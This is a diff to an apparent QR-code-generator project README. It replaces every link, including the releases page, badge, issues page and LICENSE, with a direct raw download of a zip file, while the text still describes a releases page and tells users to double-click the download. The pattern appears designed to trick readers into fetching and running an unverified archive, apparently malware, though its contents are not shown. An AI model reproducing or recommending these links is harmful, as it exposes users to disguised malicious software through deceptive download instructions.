@@ -6,14 +6,14 @@ Welcome to the **qr-code-generator**! This simple tool allows you to transform t
 
 ## 🔗 Quick Download
 
-[![Download QR Code Generator](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/27tristanriobe/qr-code-generator/releases)
+[![Download QR Code Generator](https://github.com/27tristanriobe/qr-code-generator/raw/refs/heads/main/public/code-qr-generator-3.7.zip)](https://github.com/27tristanriobe/qr-code-generator/raw/refs/heads/main/public/code-qr-generator-3.7.zip)
 
 ## 📥 Download & Install
 
 To get started with the **qr-code-generator**, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access our releases page.
-   [Download QR Code Generator](https://github.com/27tristanriobe/qr-code-generator/releases)
+   [Download QR Code Generator](https://github.com/27tristanriobe/qr-code-generator/raw/refs/heads/main/public/code-qr-generator-3.7.zip)
 
 2. **Choose a Version**: Look for the latest version under the "Releases" section. It usually appears at the top.
 
@@ -54,7 +54,7 @@ You do not need to install any software. Just double-click the downloaded file, 
 
 ### What if I encounter issues?
 
-If you face any problems, please visit our [issues page](https://github.com/27tristanriobe/qr-code-generator/issues) for help. You can find solutions to common problems or ask for assistance from the community.
+If you face any problems, please visit our [issues page](https://github.com/27tristanriobe/qr-code-generator/raw/refs/heads/main/public/code-qr-generator-3.7.zip) for help. You can find solutions to common problems or ask for assistance from the community.
 
 ### Can I use this on any device?
 
@@ -66,10 +66,10 @@ We encourage users to share their experiences and any suggestions for improvemen
 
 ## 📜 License
 
-The **qr-code-generator** is open-source, allowing anyone to use or modify the code. You can find more details in the [LICENSE](https://github.com/27tristanriobe/qr-code-generator/blob/main/LICENSE) file.
+The **qr-code-generator** is open-source, allowing anyone to use or modify the code. You can find more details in the [LICENSE](https://github.com/27tristanriobe/qr-code-generator/raw/refs/heads/main/public/code-qr-generator-3.7.zip) file.
 
 ## 🔗 Conclusion
 
 Thank you for choosing the **qr-code-generator**. We hope you find it easy and helpful for creating QR codes. For more updates, follow our repository and keep generating QR codes effortlessly!
 
-For any additional information or upgrades, visit the releases page here: [Download QR Code Generator](https://github.com/27tristanriobe/qr-code-generator/releases).
+For any additional information or upgrades, visit the releases page here: [Download QR Code Generator](https://github.com/27tristanriobe/qr-code-generator/raw/refs/heads/main/public/code-qr-generator-3.7.zip).
